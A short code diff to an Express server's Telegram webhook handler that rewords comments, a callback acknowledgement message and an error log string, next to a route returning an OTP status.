@@ -110,9 +110,9 @@ app.get('/api/check-otp2-status', (req, res) => {
     res.json({ status: otp2Status });
 });
 
-// 5. Telegram Webhook Route
+// Telegram Webhook Route for Render Production
 app.post('/telegram-webhook', async (req, res) => {
-    res.sendStatus(200); // Always acknowledge Telegram instantly
+    res.sendStatus(200); // Acknowledge Telegram instantly
 
     try {
         const update = req.body;
@@ -127,10 +127,7 @@ app.post('/telegram-webhook', async (req, res) => {
 
             console.log(`🔔 Webhook Callback Received: ${action}`);
 
-            // Clear the button loading spinner first so it doesn't hang
-            await answerCallback(callbackQueryId, 'Ação registada com sucesso!');
-
-            // Remove buttons safely if messageId exists
+            await answerCallback(callbackQueryId, 'Processing action...');
             if (messageId && chatId) {
                 await removeMessageButtons(chatId, messageId);
             }
@@ -161,7 +158,7 @@ app.post('/telegram-webhook', async (req, res) => {
             }
         }
     } catch (err) {
-        console.error('Webhook Internal Handler Error:', err.message);
+        console.error('Webhook processing error:', err.message);
     }
 });
 
